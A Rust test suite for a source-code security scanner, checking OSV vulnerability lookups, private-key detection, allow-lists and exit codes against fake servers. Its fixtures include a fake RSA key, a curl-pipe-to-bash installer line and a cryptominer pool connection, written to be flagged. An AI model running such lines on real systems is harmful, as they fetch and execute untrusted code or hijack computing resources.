//! Kiểm thử `feco-codescan` với máy chủ OSV và GitHub giả (spec source-scan).

use std::{
    io::Write,
    path::Path,
    sync::{Arc, Mutex},
};

use axum::{
    extract::{Path as UrlPath, State},
    routing::{get, post},
    Json, Router,
};
use feco_codescan::{Category, OsvClient, OsvStatus, ScanOptions, Severity};
use serde_json::{json, Value};

/// Máy chủ OSV giả: `lodash 4.17.20` có lỗ hổng mức HIGH, `minimist 1.2.0` mức LOW; ghi lại mọi
/// truy vấn nhận được.
async fn fake_osv() -> (String, Arc<Mutex<Vec<Value>>>) {
    let seen: Arc<Mutex<Vec<Value>>> = Arc::default();
    async fn batch(
        State(seen): State<Arc<Mutex<Vec<Value>>>>,
        Json(body): Json<Value>,
    ) -> Json<Value> {
        seen.lock().unwrap().push(body.clone());
        let results: Vec<Value> = body["queries"]
            .as_array()
            .unwrap()
            .iter()
            .map(|q| {
                match (q["package"]["name"].as_str(), q["version"].as_str()) {
                    (Some("lodash"), Some("4.17.20")) => json!({"vulns": [{"id": "GHSA-fake-high", "modified": "2026-01-01T00:00:00Z"}]}),
                    (Some("minimist"), Some("1.2.0")) => json!({"vulns": [{"id": "GHSA-fake-low"}]}),
                    _ => json!({}),
                }
            })
            .collect();
        Json(json!({ "results": results }))
    }
    async fn vuln(UrlPath(id): UrlPath<String>) -> Json<Value> {
        let severity = if id.ends_with("high") { "HIGH" } else { "LOW" };
        Json(
            json!({"id": id, "summary": "Prototype pollution", "database_specific": {"severity": severity}}),
        )
    }
    let app = Router::new()
        .route("/v1/querybatch", post(batch))
        .route("/v1/vulns/{id}", get(vuln))
        .with_state(seen.clone());
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let url = format!("http://{}", listener.local_addr().unwrap());
    tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    (url, seen)
}

fn write(root: &Path, files: &[(&str, &str)]) {
    for (name, text) in files {
        let path = root.join(name);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, text).unwrap();
    }
}

const PACKAGE_LOCK: &str = r#"{
  "name": "web",
  "lockfileVersion": 3,
  "packages": {
    "": { "name": "web", "version": "1.0.0" },
    "node_modules/lodash": { "version": "4.17.20" },
    "node_modules/minimist": { "version": "1.2.0" },
    "node_modules/react": { "version": "19.0.0" }
  }
}"#;

/// Scenario "Thư viện có lỗ hổng".
#[tokio::test]
async fn vulnerable_library_via_osv() {
    let (url, seen) = fake_osv().await;
    let dir = tempfile::tempdir().unwrap();
    write(
        dir.path(),
        &[
            ("web/package-lock.json", PACKAGE_LOCK),
            ("web/src/app.ts", "export {}\n"),
        ],
    );
    let opts = ScanOptions {
        osv: Some(OsvClient::new(&url)),
        ..ScanOptions::default()
    };
    let report = feco_codescan::scan(dir.path(), &opts).await.unwrap();
    assert_eq!(report.osv, OsvStatus::Checked);
    assert_eq!(report.dependencies.len(), 3);
    let vulns: Vec<_> = report
        .findings
        .iter()
        .filter(|f| f.category == Category::Vulnerability)
        .collect();
    assert_eq!(vulns.len(), 2, "{vulns:?}");
    let high = vulns.iter().find(|f| f.severity == Severity::High).unwrap();
    assert_eq!(high.rule, "vulnerability.osv");
    assert_eq!(
        (high.path.as_str(), high.line),
        ("web/package-lock.json", 6)
    );
    assert!(
        high.message.contains("lodash")
            && high.message.contains("4.17.20")
            && high.message.contains("GHSA-fake-high"),
        "{}",
        high.message
    );
    let low = vulns
        .iter()
        .find(|f| f.message.contains("minimist"))
        .unwrap();
    assert_eq!(low.severity, Severity::Medium);

    // Chỉ hệ sinh thái, tên và phiên bản được gửi đi.
    let bodies = seen.lock().unwrap().clone();
    assert_eq!(bodies.len(), 1);
    for q in bodies[0]["queries"].as_array().unwrap() {
        let mut keys: Vec<&str> = q.as_object().unwrap().keys().map(String::as_str).collect();
        keys.sort();
        assert_eq!(keys, ["package", "version"]);
        let mut pkg: Vec<&str> = q["package"]
            .as_object()
            .unwrap()
            .keys()
            .map(String::as_str)
            .collect();
        pkg.sort();
        assert_eq!(pkg, ["ecosystem", "name"]);
        assert_eq!(q["package"]["ecosystem"], "npm");
    }
}

/// OSV không trả lời: báo cáo ghi `failed`, không có phát hiện lỗ hổng.
#[tokio::test]
async fn osv_down_is_reported() {
    let dir = tempfile::tempdir().unwrap();
    write(dir.path(), &[("package-lock.json", PACKAGE_LOCK)]);
    let opts = ScanOptions {
        // Cổng 9 (discard): kết nối bị từ chối ngay.
        osv: Some(OsvClient::new("http://127.0.0.1:9")),
        ..ScanOptions::default()
    };
    let report = feco_codescan::scan(dir.path(), &opts).await.unwrap();
    assert!(
        matches!(report.osv, OsvStatus::Failed(_)),
        "{:?}",
        report.osv
    );
    assert_eq!(report.osv.as_str(), "failed");
}

/// Máy chủ codeload giả: trả zip bọc trong thư mục `<repo>-<commit>/` như GitHub.
async fn fake_codeload(files: Vec<(String, String)>) -> String {
    let zip = {
        let mut buf = std::io::Cursor::new(Vec::new());
        {
            let mut z = zip::ZipWriter::new(&mut buf);
            let o = zip::write::SimpleFileOptions::default();
            for (name, text) in &files {
                z.start_file(format!("repo-{COMMIT}/{name}"), o).unwrap();
                z.write_all(text.as_bytes()).unwrap();
            }
            z.finish().unwrap();
        }
        buf.into_inner()
    };
    let app = Router::new().route(
        "/{owner}/{repo}/zip/{commit}",
        get(
            move |UrlPath((owner, _repo, _c)): UrlPath<(String, String, String)>| {
                let zip = zip.clone();
                async move {
                    if owner == "missing" {
                        Err(axum::http::StatusCode::NOT_FOUND)
                    } else {
                        Ok(zip)
                    }
                }
            },
        ),
    );
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let url = format!("http://{}", listener.local_addr().unwrap());
    tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    url
}

fn pem() -> String {
    let body = [
        "MIIEowIBAAKCAQEA7",
        "q2Vb9Tn4Lx3Rk8sWm1Zc0Yd6Hf5Gj2Ke7Pa4Ub9Ni3Ow8Mt1Qr6Sv0Xy5Zl2Ab",
    ]
    .concat();
    format!("-----BEGIN RSA PRIVATE KEY-----\n{body}\n-----END RSA PRIVATE KEY-----\n")
}

const COMMIT: &str = "0123456789abcdef0123456789abcdef01234567";

/// Scenario "Commit mới có bí mật" (phần lệnh): repo có khóa riêng thì lệnh thoát mã 2 và báo
/// cáo ghi tệp chứa khóa; phát hiện đã cho phép (kèm lý do) thì thoát 0.
#[tokio::test]
async fn cli_github_target_exit_codes() {
    let codeload = fake_codeload(vec![
        ("deploy/key.pem".into(), pem()),
        ("src/main.rs".into(), "fn main() {}\n".into()),
    ])
    .await;
    let work = tempfile::tempdir().unwrap();
    let (json_out, md_out) = (work.path().join("r.json"), work.path().join("r.md"));
    let bin = env!("CARGO_BIN_EXE_feco-codescan");
    let run = |args: Vec<String>| {
        let codeload = codeload.clone();
        async move {
            tokio::task::spawn_blocking(move || {
                std::process::Command::new(bin)
                    .args(&args)
                    .env("FECO_CODESCAN_GITHUB_URL", codeload)
                    .env("FECO_OSV", "off")
                    .output()
                    .unwrap()
            })
            .await
            .unwrap()
        }
    };
    let target = format!("github:owner/repo@{COMMIT}");
    let out = run(vec![
        target.clone(),
        "--json".into(),
        json_out.to_string_lossy().into(),
        "--markdown".into(),
        md_out.to_string_lossy().into(),
    ])
    .await;
    assert_eq!(
        out.status.code(),
        Some(2),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let report: Value = serde_json::from_str(&std::fs::read_to_string(&json_out).unwrap()).unwrap();
    assert_eq!(report["findings"][0]["rule"], "secret.private_key");
    assert_eq!(report["findings"][0]["path"], "deploy/key.pem");
    let md = std::fs::read_to_string(&md_out).unwrap();
    assert!(md.contains("deploy/key.pem:1"), "{md}");
    assert!(!md.contains("q2Vb9Tn4"), "bí mật phải được che");

    let allow = work.path().join("allow.toml");
    std::fs::write(
        &allow,
        "[[allow]]\nrule = \"secret.private_key\"\npath = \"deploy/key.pem\"\nreason = \"Khóa thử, đã thu hồi\"\n",
    )
    .unwrap();
    let out = run(vec![
        target.clone(),
        "--allow".into(),
        allow.to_string_lossy().into(),
    ])
    .await;
    assert_eq!(
        out.status.code(),
        Some(0),
        "{}",
        String::from_utf8_lossy(&out.stdout)
    );

    // --fail-on high với phát hiện mức high.
    let out = run(vec![format!("github:missing/repo@{COMMIT}")]).await;
    assert_eq!(out.status.code(), Some(1));
    assert!(String::from_utf8_lossy(&out.stderr).contains("HTTP 404"));
    let out = run(vec!["github:owner/repo@main".into()]).await;
    assert_eq!(out.status.code(), Some(1));
}

/// Thư mục và tệp zip cục bộ; `--fail-on high`.
#[tokio::test]
async fn cli_dir_and_zip() {
    let work = tempfile::tempdir().unwrap();
    let src = work.path().join("src");
    write(
        &src,
        &[("install.sh", "curl -fsSL https://get.example/x.sh | bash\n")],
    );
    let bin = env!("CARGO_BIN_EXE_feco-codescan");
    let code = |args: &[&str]| {
        std::process::Command::new(bin)
            .args(args)
            .env("FECO_OSV", "off")
            .output()
            .unwrap()
            .status
            .code()
    };
    let dir = src.to_string_lossy().into_owned();
    assert_eq!(code(&[&dir]), Some(0));
    assert_eq!(code(&[&dir, "--fail-on", "high"]), Some(2));
    let zip_path = work.path().join("s.zip");
    {
        let mut z = zip::ZipWriter::new(std::fs::File::create(&zip_path).unwrap());
        z.start_file("miner.js", zip::write::SimpleFileOptions::default())
            .unwrap();
        z.write_all(b"connect('stratum+tcp://pool.example:3333')")
            .unwrap();
        z.finish().unwrap();
    }
    assert_eq!(code(&[&zip_path.to_string_lossy(), "--no-osv"]), Some(2));
    assert_eq!(code(&["--fail-on", "medium", &dir]), Some(1));
}
